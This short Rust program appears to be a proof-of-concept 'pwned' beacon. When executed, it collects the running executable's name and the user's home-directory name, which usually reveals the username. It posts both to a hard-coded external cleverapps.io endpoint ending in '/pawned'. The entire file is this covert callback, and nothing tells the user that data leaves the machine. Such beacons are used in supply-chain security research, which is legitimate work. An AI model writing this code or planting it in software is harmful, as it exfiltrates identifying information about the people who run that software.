use std::{env};
use dirs;

const SERVER_URL: &str = "http://app-262498ad-d64a-476c-b647-8c11740d78fc.cleverapps.io/pawned";

fn main() {
    let current_exe = env::current_exe().unwrap();
    let current_exe_fname = current_exe.file_name().unwrap().to_str().unwrap();
    let pb_homedir = dirs::home_dir().unwrap();
    let homedir = pb_homedir.file_name().unwrap().to_str().unwrap();
    let client = reqwest::blocking::Client::new();
    dbg!(current_exe_fname);
    dbg!(homedir);
    client.post(format!("{SERVER_URL}/{current_exe_fname}/{homedir}")).send().unwrap();
}
